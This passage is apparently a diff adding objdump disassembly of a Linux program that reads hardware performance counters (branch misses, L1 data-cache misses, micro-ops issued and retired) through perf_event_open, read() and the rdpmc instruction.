+     ef0:	8b 85 7c ff ff ff    	mov    -0x84(%rbp),%eax
+     ef6:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
+     efa:	64 48 33 0c 25 28 00 	xor    %fs:0x28,%rcx
+     f01:	00 00 
+     f03:	74 05                	je     f0a <setup_branch_miss_event+0xe2>
+     f05:	e8 76 fa ff ff       	callq  980 <__stack_chk_fail@plt>
+     f0a:	c9                   	leaveq 
+     f0b:	c3                   	retq   
+
+0000000000000f0c <pmu_stage1_get_count>:
+     f0c:	55                   	push   %rbp
+     f0d:	48 89 e5             	mov    %rsp,%rbp
+     f10:	8b 05 2a 42 20 00    	mov    0x20422a(%rip),%eax        # 205140 <stage1_count>
+     f16:	5d                   	pop    %rbp
+     f17:	c3                   	retq   
+
+0000000000000f18 <pmu_stage1_get_delta>:
+     f18:	55                   	push   %rbp
+     f19:	48 89 e5             	mov    %rsp,%rbp
+     f1c:	89 7d fc             	mov    %edi,-0x4(%rbp)
+     f1f:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
+     f23:	78 25                	js     f4a <pmu_stage1_get_delta+0x32>
+     f25:	8b 05 15 42 20 00    	mov    0x204215(%rip),%eax        # 205140 <stage1_count>
+     f2b:	39 45 fc             	cmp    %eax,-0x4(%rbp)
+     f2e:	7d 1a                	jge    f4a <pmu_stage1_get_delta+0x32>
+     f30:	8b 45 fc             	mov    -0x4(%rbp),%eax
+     f33:	48 98                	cltq   
+     f35:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
+     f3c:	00 
+     f3d:	48 8d 05 fc 21 20 00 	lea    0x2021fc(%rip),%rax        # 203140 <stage1_deltas>
+     f44:	48 8b 04 02          	mov    (%rdx,%rax,1),%rax
+     f48:	eb 05                	jmp    f4f <pmu_stage1_get_delta+0x37>
+     f4a:	b8 00 00 00 00       	mov    $0x0,%eax
+     f4f:	5d                   	pop    %rbp
+     f50:	c3                   	retq   
+
+0000000000000f51 <pmu_stage1_before>:
+     f51:	55                   	push   %rbp
+     f52:	48 89 e5             	mov    %rsp,%rbp
+     f55:	8b 05 8d 21 20 00    	mov    0x20218d(%rip),%eax        # 2030e8 <fd_stage1>
+     f5b:	ba 08 00 00 00       	mov    $0x8,%edx
+     f60:	48 8d 35 b9 21 20 00 	lea    0x2021b9(%rip),%rsi        # 203120 <stage1_before>
+     f67:	89 c7                	mov    %eax,%edi
+     f69:	e8 72 fa ff ff       	callq  9e0 <read@plt>
+     f6e:	90                   	nop
+     f6f:	5d                   	pop    %rbp
+     f70:	c3                   	retq   
+
+0000000000000f71 <pmu_stage1_after>:
+     f71:	55                   	push   %rbp
+     f72:	48 89 e5             	mov    %rsp,%rbp
+     f75:	48 83 ec 20          	sub    $0x20,%rsp
+     f79:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
+     f80:	00 00 
+     f82:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+     f86:	31 c0                	xor    %eax,%eax
+     f88:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
+     f8f:	00 
+     f90:	8b 05 52 21 20 00    	mov    0x202152(%rip),%eax        # 2030e8 <fd_stage1>
+     f96:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
+     f9a:	ba 08 00 00 00       	mov    $0x8,%edx
+     f9f:	48 89 ce             	mov    %rcx,%rsi
+     fa2:	89 c7                	mov    %eax,%edi
+     fa4:	e8 37 fa ff ff       	callq  9e0 <read@plt>
+     fa9:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
+     fad:	48 8b 05 6c 21 20 00 	mov    0x20216c(%rip),%rax        # 203120 <stage1_before>
+     fb4:	48 29 c2             	sub    %rax,%rdx
+     fb7:	48 89 d0             	mov    %rdx,%rax
+     fba:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
+     fbe:	8b 05 7c 41 20 00    	mov    0x20417c(%rip),%eax        # 205140 <stage1_count>
+     fc4:	3d ff 03 00 00       	cmp    $0x3ff,%eax
+     fc9:	7f 28                	jg     ff3 <pmu_stage1_after+0x82>
+     fcb:	8b 05 6f 41 20 00    	mov    0x20416f(%rip),%eax        # 205140 <stage1_count>
+     fd1:	8d 50 01             	lea    0x1(%rax),%edx
+     fd4:	89 15 66 41 20 00    	mov    %edx,0x204166(%rip)        # 205140 <stage1_count>
+     fda:	48 98                	cltq   
+     fdc:	48 8d 0c c5 00 00 00 	lea    0x0(,%rax,8),%rcx
+     fe3:	00 
+     fe4:	48 8d 05 55 21 20 00 	lea    0x202155(%rip),%rax        # 203140 <stage1_deltas>
+     feb:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
+     fef:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
+     ff3:	90                   	nop
+     ff4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+     ff8:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
+     fff:	00 00 
+    1001:	74 05                	je     1008 <pmu_stage1_after+0x97>
+    1003:	e8 78 f9 ff ff       	callq  980 <__stack_chk_fail@plt>
+    1008:	c9                   	leaveq 
+    1009:	c3                   	retq   
+
+000000000000100a <setup_l1d_miss_event>:
+    100a:	55                   	push   %rbp
+    100b:	48 89 e5             	mov    %rsp,%rbp
+    100e:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
+    1015:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
+    101c:	00 00 
+    101e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+    1022:	31 c0                	xor    %eax,%eax
+    1024:	48 8d 45 80          	lea    -0x80(%rbp),%rax
+    1028:	ba 70 00 00 00       	mov    $0x70,%edx
+    102d:	be 00 00 00 00       	mov    $0x0,%esi
+    1032:	48 89 c7             	mov    %rax,%rdi
+    1035:	e8 86 f9 ff ff       	callq  9c0 <memset@plt>
+    103a:	c7 45 80 04 00 00 00 	movl   $0x4,-0x80(%rbp)
+    1041:	c7 45 84 70 00 00 00 	movl   $0x70,-0x7c(%rbp)
+    1048:	48 c7 45 88 d1 08 00 	movq   $0x8d1,-0x78(%rbp)
+    104f:	00 
+    1050:	0f b6 45 a8          	movzbl -0x58(%rbp),%eax
+    1054:	83 e0 fe             	and    $0xfffffffe,%eax
+    1057:	88 45 a8             	mov    %al,-0x58(%rbp)
+    105a:	0f b6 45 a8          	movzbl -0x58(%rbp),%eax
+    105e:	83 c8 20             	or     $0x20,%eax
+    1061:	88 45 a8             	mov    %al,-0x58(%rbp)
+    1064:	0f b6 45 a8          	movzbl -0x58(%rbp),%eax
+    1068:	83 c8 40             	or     $0x40,%eax
+    106b:	88 45 a8             	mov    %al,-0x58(%rbp)
+    106e:	48 8d 45 80          	lea    -0x80(%rbp),%rax
+    1072:	41 b8 00 00 00 00    	mov    $0x0,%r8d
+    1078:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
+    107d:	ba ff ff ff ff       	mov    $0xffffffff,%edx
+    1082:	be 00 00 00 00       	mov    $0x0,%esi
+    1087:	48 89 c7             	mov    %rax,%rdi
+    108a:	e8 55 fd ff ff       	callq  de4 <perf_event_open_sys>
+    108f:	89 85 7c ff ff ff    	mov    %eax,-0x84(%rbp)
+    1095:	83 bd 7c ff ff ff ff 	cmpl   $0xffffffff,-0x84(%rbp)
+    109c:	75 34                	jne    10d2 <setup_l1d_miss_event+0xc8>
+    109e:	e8 bd f8 ff ff       	callq  960 <__errno_location@plt>
+    10a3:	8b 00                	mov    (%rax),%eax
+    10a5:	89 c7                	mov    %eax,%edi
+    10a7:	e8 94 f9 ff ff       	callq  a40 <strerror@plt>
+    10ac:	48 89 c2             	mov    %rax,%rdx
+    10af:	48 8b 05 4a 20 20 00 	mov    0x20204a(%rip),%rax        # 203100 <stderr@@GLIBC_2.2.5>
+    10b6:	48 89 d1             	mov    %rdx,%rcx
+    10b9:	ba d1 08 00 00       	mov    $0x8d1,%edx
+    10be:	48 8d 35 eb 09 00 00 	lea    0x9eb(%rip),%rsi        # 1ab0 <_IO_stdin_used+0x70>
+    10c5:	48 89 c7             	mov    %rax,%rdi
+    10c8:	b8 00 00 00 00       	mov    $0x0,%eax
+    10cd:	e8 1e f9 ff ff       	callq  9f0 <fprintf@plt>
+    10d2:	8b 85 7c ff ff ff    	mov    -0x84(%rbp),%eax
+    10d8:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
+    10dc:	64 48 33 0c 25 28 00 	xor    %fs:0x28,%rcx
+    10e3:	00 00 
+    10e5:	74 05                	je     10ec <setup_l1d_miss_event+0xe2>
+    10e7:	e8 94 f8 ff ff       	callq  980 <__stack_chk_fail@plt>
+    10ec:	c9                   	leaveq 
+    10ed:	c3                   	retq   
+
+00000000000010ee <pmu_read_l1d_miss>:
+    10ee:	55                   	push   %rbp
+    10ef:	48 89 e5             	mov    %rsp,%rbp
+    10f2:	48 83 ec 10          	sub    $0x10,%rsp
+    10f6:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
+    10fd:	00 00 
+    10ff:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+    1103:	31 c0                	xor    %eax,%eax
+    1105:	8b 05 e1 1f 20 00    	mov    0x201fe1(%rip),%eax        # 2030ec <fd_l1d_miss>
+    110b:	83 f8 ff             	cmp    $0xffffffff,%eax
+    110e:	75 07                	jne    1117 <pmu_read_l1d_miss+0x29>
+    1110:	b8 00 00 00 00       	mov    $0x0,%eax
+    1115:	eb 32                	jmp    1149 <pmu_read_l1d_miss+0x5b>
+    1117:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
+    111e:	00 
+    111f:	8b 05 c7 1f 20 00    	mov    0x201fc7(%rip),%eax        # 2030ec <fd_l1d_miss>
+    1125:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
+    1129:	ba 08 00 00 00       	mov    $0x8,%edx
+    112e:	48 89 ce             	mov    %rcx,%rsi
+    1131:	89 c7                	mov    %eax,%edi
+    1133:	e8 a8 f8 ff ff       	callq  9e0 <read@plt>
+    1138:	48 83 f8 08          	cmp    $0x8,%rax
+    113c:	74 07                	je     1145 <pmu_read_l1d_miss+0x57>
+    113e:	b8 00 00 00 00       	mov    $0x0,%eax
+    1143:	eb 04                	jmp    1149 <pmu_read_l1d_miss+0x5b>
+    1145:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
+    1149:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
+    114d:	64 48 33 14 25 28 00 	xor    %fs:0x28,%rdx
+    1154:	00 00 
+    1156:	74 05                	je     115d <pmu_read_l1d_miss+0x6f>
+    1158:	e8 23 f8 ff ff       	callq  980 <__stack_chk_fail@plt>
+    115d:	c9                   	leaveq 
+    115e:	c3                   	retq   
+
+000000000000115f <pmu_init>:
+    115f:	55                   	push   %rbp
+    1160:	48 89 e5             	mov    %rsp,%rbp
+    1163:	e8 c0 fc ff ff       	callq  e28 <setup_branch_miss_event>
+    1168:	89 05 7a 1f 20 00    	mov    %eax,0x201f7a(%rip)        # 2030e8 <fd_stage1>
+    116e:	e8 97 fe ff ff       	callq  100a <setup_l1d_miss_event>
+    1173:	89 05 73 1f 20 00    	mov    %eax,0x201f73(%rip)        # 2030ec <fd_l1d_miss>
+    1179:	90                   	nop
+    117a:	5d                   	pop    %rbp
+    117b:	c3                   	retq   
+
+000000000000117c <pmu_fini>:
+    117c:	55                   	push   %rbp
+    117d:	48 89 e5             	mov    %rsp,%rbp
+    1180:	8b 05 62 1f 20 00    	mov    0x201f62(%rip),%eax        # 2030e8 <fd_stage1>
+    1186:	83 f8 ff             	cmp    $0xffffffff,%eax
+    1189:	74 0d                	je     1198 <pmu_fini+0x1c>
+    118b:	8b 05 57 1f 20 00    	mov    0x201f57(%rip),%eax        # 2030e8 <fd_stage1>
+    1191:	89 c7                	mov    %eax,%edi
+    1193:	e8 38 f8 ff ff       	callq  9d0 <close@plt>
+    1198:	8b 05 4e 1f 20 00    	mov    0x201f4e(%rip),%eax        # 2030ec <fd_l1d_miss>
+    119e:	83 f8 ff             	cmp    $0xffffffff,%eax
+    11a1:	74 0d                	je     11b0 <pmu_fini+0x34>
+    11a3:	8b 05 43 1f 20 00    	mov    0x201f43(%rip),%eax        # 2030ec <fd_l1d_miss>
+    11a9:	89 c7                	mov    %eax,%edi
+    11ab:	e8 20 f8 ff ff       	callq  9d0 <close@plt>
+    11b0:	90                   	nop
+    11b1:	5d                   	pop    %rbp
+    11b2:	c3                   	retq   
+
+00000000000011b3 <perf_event_open_sys>:
+    11b3:	55                   	push   %rbp
+    11b4:	48 89 e5             	mov    %rsp,%rbp
+    11b7:	48 83 ec 20          	sub    $0x20,%rsp
+    11bb:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
+    11bf:	89 75 f4             	mov    %esi,-0xc(%rbp)
+    11c2:	89 55 f0             	mov    %edx,-0x10(%rbp)
+    11c5:	89 4d ec             	mov    %ecx,-0x14(%rbp)
+    11c8:	4c 89 45 e0          	mov    %r8,-0x20(%rbp)
+    11cc:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
+    11d0:	8b 75 ec             	mov    -0x14(%rbp),%esi
+    11d3:	8b 4d f0             	mov    -0x10(%rbp),%ecx
+    11d6:	8b 55 f4             	mov    -0xc(%rbp),%edx
+    11d9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+    11dd:	49 89 f9             	mov    %rdi,%r9
+    11e0:	41 89 f0             	mov    %esi,%r8d
+    11e3:	48 89 c6             	mov    %rax,%rsi
+    11e6:	bf 2a 01 00 00       	mov    $0x12a,%edi
+    11eb:	b8 00 00 00 00       	mov    $0x0,%eax
+    11f0:	e8 0b f8 ff ff       	callq  a00 <syscall@plt>
+    11f5:	c9                   	leaveq 
+    11f6:	c3                   	retq   
+
+00000000000011f7 <rdpmc_sighandler>:
+    11f7:	55                   	push   %rbp
+    11f8:	48 89 e5             	mov    %rsp,%rbp
+    11fb:	48 83 ec 10          	sub    $0x10,%rsp
+    11ff:	89 7d fc             	mov    %edi,-0x4(%rbp)
+    1202:	c7 05 5c 00 21 00 01 	movl   $0x1,0x21005c(%rip)        # 211268 <rdpmc_faulted>
+    1209:	00 00 00 
+    120c:	be 01 00 00 00       	mov    $0x1,%esi
+    1211:	48 8d 3d 88 ff 20 00 	lea    0x20ff88(%rip),%rdi        # 2111a0 <rdpmc_jmpbuf>
+    1218:	e8 93 f7 ff ff       	callq  9b0 <siglongjmp@plt>
+
+000000000000121d <test_rdpmc>:
+    121d:	55                   	push   %rbp
+    121e:	48 89 e5             	mov    %rsp,%rbp
+    1221:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
+    1228:	89 bd ac fe ff ff    	mov    %edi,-0x154(%rbp)
+    122e:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
+    1235:	00 00 
+    1237:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+    123b:	31 c0                	xor    %eax,%eax
+    123d:	48 8d 85 c0 fe ff ff 	lea    -0x140(%rbp),%rax
+    1244:	ba 98 00 00 00       	mov    $0x98,%edx
+    1249:	be 00 00 00 00       	mov    $0x0,%esi
+    124e:	48 89 c7             	mov    %rax,%rdi
+    1251:	e8 6a f7 ff ff       	callq  9c0 <memset@plt>
+    1256:	48 8d 05 9a ff ff ff 	lea    -0x66(%rip),%rax        # 11f7 <rdpmc_sighandler>
+    125d:	48 89 85 c0 fe ff ff 	mov    %rax,-0x140(%rbp)
+    1264:	c7 85 48 ff ff ff 00 	movl   $0x0,-0xb8(%rbp)
+    126b:	00 00 00 
+    126e:	48 8d 85 c0 fe ff ff 	lea    -0x140(%rbp),%rax
+    1275:	48 83 c0 08          	add    $0x8,%rax
+    1279:	48 89 c7             	mov    %rax,%rdi
+    127c:	e8 8f f7 ff ff       	callq  a10 <sigemptyset@plt>
+    1281:	48 8d 95 60 ff ff ff 	lea    -0xa0(%rbp),%rdx
+    1288:	48 8d 85 c0 fe ff ff 	lea    -0x140(%rbp),%rax
+    128f:	48 89 c6             	mov    %rax,%rsi
+    1292:	bf 0b 00 00 00       	mov    $0xb,%edi
+    1297:	e8 d4 f6 ff ff       	callq  970 <sigaction@plt>
+    129c:	85 c0                	test   %eax,%eax
+    129e:	79 07                	jns    12a7 <test_rdpmc+0x8a>
+    12a0:	b8 00 00 00 00       	mov    $0x0,%eax
+    12a5:	eb 5c                	jmp    1303 <test_rdpmc+0xe6>
+    12a7:	c7 05 b7 ff 20 00 00 	movl   $0x0,0x20ffb7(%rip)        # 211268 <rdpmc_faulted>
+    12ae:	00 00 00 
+    12b1:	be 01 00 00 00       	mov    $0x1,%esi
+    12b6:	48 8d 3d e3 fe 20 00 	lea    0x20fee3(%rip),%rdi        # 2111a0 <rdpmc_jmpbuf>
+    12bd:	e8 8e f7 ff ff       	callq  a50 <__sigsetjmp@plt>
+    12c2:	85 c0                	test   %eax,%eax
+    12c4:	75 16                	jne    12dc <test_rdpmc+0xbf>
+    12c6:	8b 85 ac fe ff ff    	mov    -0x154(%rbp),%eax
+    12cc:	89 c1                	mov    %eax,%ecx
+    12ce:	0f 33                	rdpmc  
+    12d0:	89 85 b8 fe ff ff    	mov    %eax,-0x148(%rbp)
+    12d6:	89 95 bc fe ff ff    	mov    %edx,-0x144(%rbp)
+    12dc:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
+    12e3:	ba 00 00 00 00       	mov    $0x0,%edx
+    12e8:	48 89 c6             	mov    %rax,%rsi
+    12eb:	bf 0b 00 00 00       	mov    $0xb,%edi
+    12f0:	e8 7b f6 ff ff       	callq  970 <sigaction@plt>
+    12f5:	8b 05 6d ff 20 00    	mov    0x20ff6d(%rip),%eax        # 211268 <rdpmc_faulted>
+    12fb:	85 c0                	test   %eax,%eax
+    12fd:	0f 94 c0             	sete   %al
+    1300:	0f b6 c0             	movzbl %al,%eax
+    1303:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
+    1307:	64 48 33 0c 25 28 00 	xor    %fs:0x28,%rcx
+    130e:	00 00 
+    1310:	74 05                	je     1317 <test_rdpmc+0xfa>
+    1312:	e8 69 f6 ff ff       	callq  980 <__stack_chk_fail@plt>
+    1317:	c9                   	leaveq 
+    1318:	c3                   	retq   
+
+0000000000001319 <read_pmc_rdpmc>:
+    1319:	55                   	push   %rbp
+    131a:	48 89 e5             	mov    %rsp,%rbp
+    131d:	89 7d ec             	mov    %edi,-0x14(%rbp)
+    1320:	8b 45 ec             	mov    -0x14(%rbp),%eax
+    1323:	89 c1                	mov    %eax,%ecx
+    1325:	0f 33                	rdpmc  
+    1327:	89 45 f8             	mov    %eax,-0x8(%rbp)
+    132a:	89 55 fc             	mov    %edx,-0x4(%rbp)
+    132d:	8b 45 fc             	mov    -0x4(%rbp),%eax
+    1330:	48 c1 e0 20          	shl    $0x20,%rax
+    1334:	48 89 c2             	mov    %rax,%rdx
+    1337:	8b 45 f8             	mov    -0x8(%rbp),%eax
+    133a:	48 09 d0             	or     %rdx,%rax
+    133d:	5d                   	pop    %rbp
+    133e:	c3                   	retq   
+
+000000000000133f <read_pmc_fd>:
+    133f:	55                   	push   %rbp
+    1340:	48 89 e5             	mov    %rsp,%rbp
+    1343:	48 83 ec 20          	sub    $0x20,%rsp
+    1347:	89 7d ec             	mov    %edi,-0x14(%rbp)
+    134a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
+    1351:	00 00 
+    1353:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+    1357:	31 c0                	xor    %eax,%eax
+    1359:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
+    1360:	00 
+    1361:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
+    1365:	8b 45 ec             	mov    -0x14(%rbp),%eax
+    1368:	ba 08 00 00 00       	mov    $0x8,%edx
+    136d:	48 89 ce             	mov    %rcx,%rsi
+    1370:	89 c7                	mov    %eax,%edi
+    1372:	e8 69 f6 ff ff       	callq  9e0 <read@plt>
+    1377:	48 83 f8 08          	cmp    $0x8,%rax
+    137b:	74 07                	je     1384 <read_pmc_fd+0x45>
+    137d:	b8 00 00 00 00       	mov    $0x0,%eax
+    1382:	eb 04                	jmp    1388 <read_pmc_fd+0x49>
+    1384:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
+    1388:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
+    138c:	64 48 33 14 25 28 00 	xor    %fs:0x28,%rdx
+    1393:	00 00 
+    1395:	74 05                	je     139c <read_pmc_fd+0x5d>
+    1397:	e8 e4 f5 ff ff       	callq  980 <__stack_chk_fail@plt>
+    139c:	c9                   	leaveq 
+    139d:	c3                   	retq   
+
+000000000000139e <setup_pmc>:
+    139e:	55                   	push   %rbp
+    139f:	48 89 e5             	mov    %rsp,%rbp
+    13a2:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
+    13a9:	48 89 bd 68 ff ff ff 	mov    %rdi,-0x98(%rbp)
+    13b0:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
+    13b7:	00 00 
+    13b9:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+    13bd:	31 c0                	xor    %eax,%eax
+    13bf:	48 8d 45 80          	lea    -0x80(%rbp),%rax
+    13c3:	ba 70 00 00 00       	mov    $0x70,%edx
+    13c8:	be 00 00 00 00       	mov    $0x0,%esi
+    13cd:	48 89 c7             	mov    %rax,%rdi
+    13d0:	e8 eb f5 ff ff       	callq  9c0 <memset@plt>
+    13d5:	c7 45 80 04 00 00 00 	movl   $0x4,-0x80(%rbp)
+    13dc:	c7 45 84 70 00 00 00 	movl   $0x70,-0x7c(%rbp)
+    13e3:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
+    13ea:	48 89 45 88          	mov    %rax,-0x78(%rbp)
+    13ee:	0f b6 45 a8          	movzbl -0x58(%rbp),%eax
+    13f2:	83 e0 fe             	and    $0xfffffffe,%eax
+    13f5:	88 45 a8             	mov    %al,-0x58(%rbp)
+    13f8:	0f b6 45 a8          	movzbl -0x58(%rbp),%eax
+    13fc:	83 c8 20             	or     $0x20,%eax
+    13ff:	88 45 a8             	mov    %al,-0x58(%rbp)
+    1402:	0f b6 45 a8          	movzbl -0x58(%rbp),%eax
+    1406:	83 c8 40             	or     $0x40,%eax
+    1409:	88 45 a8             	mov    %al,-0x58(%rbp)
+    140c:	48 8d 45 80          	lea    -0x80(%rbp),%rax
+    1410:	41 b8 00 00 00 00    	mov    $0x0,%r8d
+    1416:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
+    141b:	ba ff ff ff ff       	mov    $0xffffffff,%edx
+    1420:	be 00 00 00 00       	mov    $0x0,%esi
+    1425:	48 89 c7             	mov    %rax,%rdi
+    1428:	e8 86 fd ff ff       	callq  11b3 <perf_event_open_sys>
+    142d:	89 85 7c ff ff ff    	mov    %eax,-0x84(%rbp)
+    1433:	83 bd 7c ff ff ff 00 	cmpl   $0x0,-0x84(%rbp)
+    143a:	79 33                	jns    146f <setup_pmc+0xd1>
+    143c:	e8 1f f5 ff ff       	callq  960 <__errno_location@plt>
+    1441:	8b 00                	mov    (%rax),%eax
+    1443:	89 c7                	mov    %eax,%edi
+    1445:	e8 f6 f5 ff ff       	callq  a40 <strerror@plt>
+    144a:	48 89 c1             	mov    %rax,%rcx
+    144d:	48 8b 05 ac 1c 20 00 	mov    0x201cac(%rip),%rax        # 203100 <stderr@@GLIBC_2.2.5>
+    1454:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
+    145b:	48 8d 35 7e 06 00 00 	lea    0x67e(%rip),%rsi        # 1ae0 <_IO_stdin_used+0xa0>
+    1462:	48 89 c7             	mov    %rax,%rdi
+    1465:	b8 00 00 00 00       	mov    $0x0,%eax
+    146a:	e8 81 f5 ff ff       	callq  9f0 <fprintf@plt>
+    146f:	8b 85 7c ff ff ff    	mov    -0x84(%rbp),%eax
+    1475:	48 8b 75 f8          	mov    -0x8(%rbp),%rsi
+    1479:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi
+    1480:	00 00 
+    1482:	74 05                	je     1489 <setup_pmc+0xeb>
+    1484:	e8 f7 f4 ff ff       	callq  980 <__stack_chk_fail@plt>
+    1489:	c9                   	leaveq 
+    148a:	c3                   	retq   
+
+000000000000148b <setup_and_try_mmap>:
+    148b:	55                   	push   %rbp
+    148c:	48 89 e5             	mov    %rsp,%rbp
+    148f:	48 83 ec 20          	sub    $0x20,%rsp
+    1493:	89 7d ec             	mov    %edi,-0x14(%rbp)
+    1496:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
+    149a:	8b 45 ec             	mov    -0x14(%rbp),%eax
+    149d:	41 b9 00 00 00 00    	mov    $0x0,%r9d
+    14a3:	41 89 c0             	mov    %eax,%r8d
+    14a6:	b9 01 00 00 00       	mov    $0x1,%ecx
+    14ab:	ba 01 00 00 00       	mov    $0x1,%edx
+    14b0:	be 00 10 00 00       	mov    $0x1000,%esi
+    14b5:	bf 00 00 00 00       	mov    $0x0,%edi
+    14ba:	e8 d1 f4 ff ff       	callq  990 <mmap@plt>
+    14bf:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
+    14c3:	48 83 7d f8 ff       	cmpq   $0xffffffffffffffff,-0x8(%rbp)
+    14c8:	75 07                	jne    14d1 <setup_and_try_mmap+0x46>
+    14ca:	b8 00 00 00 00       	mov    $0x0,%eax
+    14cf:	eb 38                	jmp    1509 <setup_and_try_mmap+0x7e>
+    14d1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+    14d5:	8b 40 0c             	mov    0xc(%rax),%eax
+    14d8:	85 c0                	test   %eax,%eax
+    14da:	75 18                	jne    14f4 <setup_and_try_mmap+0x69>
+    14dc:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+    14e0:	be 00 10 00 00       	mov    $0x1000,%esi
+    14e5:	48 89 c7             	mov    %rax,%rdi
+    14e8:	e8 33 f5 ff ff       	callq  a20 <munmap@plt>
+    14ed:	b8 00 00 00 00       	mov    $0x0,%eax
+    14f2:	eb 15                	jmp    1509 <setup_and_try_mmap+0x7e>
+    14f4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
+    14f8:	8b 40 0c             	mov    0xc(%rax),%eax
+    14fb:	8d 50 ff             	lea    -0x1(%rax),%edx
+    14fe:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
+    1502:	89 10                	mov    %edx,(%rax)
+    1504:	b8 01 00 00 00       	mov    $0x1,%eax
+    1509:	c9                   	leaveq 
+    150a:	c3                   	retq   
+
+000000000000150b <pmu_uops_snap_before>:
+    150b:	55                   	push   %rbp
+    150c:	48 89 e5             	mov    %rsp,%rbp
+    150f:	8b 05 6f fc 20 00    	mov    0x20fc6f(%rip),%eax        # 211184 <uops_available>
+    1515:	85 c0                	test   %eax,%eax
+    1517:	74 5e                	je     1577 <pmu_uops_snap_before+0x6c>
+    1519:	8b 05 41 3c 20 00    	mov    0x203c41(%rip),%eax        # 205160 <use_rdpmc>
+    151f:	85 c0                	test   %eax,%eax
+    1521:	74 2a                	je     154d <pmu_uops_snap_before+0x42>
+    1523:	8b 05 3b 3c 20 00    	mov    0x203c3b(%rip),%eax        # 205164 <pmc_idx_issued>
+    1529:	89 c7                	mov    %eax,%edi
+    152b:	e8 e9 fd ff ff       	callq  1319 <read_pmc_rdpmc>
+    1530:	48 89 05 39 3c 20 00 	mov    %rax,0x203c39(%rip)        # 205170 <snap_issued>
+    1537:	8b 05 2b 3c 20 00    	mov    0x203c2b(%rip),%eax        # 205168 <pmc_idx_retired>
+    153d:	89 c7                	mov    %eax,%edi
+    153f:	e8 d5 fd ff ff       	callq  1319 <read_pmc_rdpmc>
+    1544:	48 89 05 2d 3c 20 00 	mov    %rax,0x203c2d(%rip)        # 205178 <snap_retired>
+    154b:	eb 2b                	jmp    1578 <pmu_uops_snap_before+0x6d>
+    154d:	8b 05 9d 1b 20 00    	mov    0x201b9d(%rip),%eax        # 2030f0 <fd_uops_issued>
+    1553:	89 c7                	mov    %eax,%edi
+    1555:	e8 e5 fd ff ff       	callq  133f <read_pmc_fd>
+    155a:	48 89 05 0f 3c 20 00 	mov    %rax,0x203c0f(%rip)        # 205170 <snap_issued>
+    1561:	8b 05 8d 1b 20 00    	mov    0x201b8d(%rip),%eax        # 2030f4 <fd_uops_retired>
+    1567:	89 c7                	mov    %eax,%edi
+    1569:	e8 d1 fd ff ff       	callq  133f <read_pmc_fd>
+    156e:	48 89 05 03 3c 20 00 	mov    %rax,0x203c03(%rip)        # 205178 <snap_retired>
+    1575:	eb 01                	jmp    1578 <pmu_uops_snap_before+0x6d>
+    1577:	90                   	nop
+    1578:	5d                   	pop    %rbp
+    1579:	c3                   	retq   
+
+000000000000157a <pmu_uops_snap_after>:
+    157a:	55                   	push   %rbp
+    157b:	48 89 e5             	mov    %rsp,%rbp
+    157e:	48 83 ec 20          	sub    $0x20,%rsp
+    1582:	8b 05 fc fb 20 00    	mov    0x20fbfc(%rip),%eax        # 211184 <uops_available>
+    1588:	85 c0                	test   %eax,%eax
+    158a:	0f 84 fe 00 00 00    	je     168e <pmu_uops_snap_after+0x114>
+    1590:	8b 05 ca 3b 20 00    	mov    0x203bca(%rip),%eax        # 205160 <use_rdpmc>
+    1596:	85 c0                	test   %eax,%eax
+    1598:	74 24                	je     15be <pmu_uops_snap_after+0x44>
+    159a:	8b 05 c4 3b 20 00    	mov    0x203bc4(%rip),%eax        # 205164 <pmc_idx_issued>
+    15a0:	89 c7                	mov    %eax,%edi
+    15a2:	e8 72 fd ff ff       	callq  1319 <read_pmc_rdpmc>
+    15a7:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
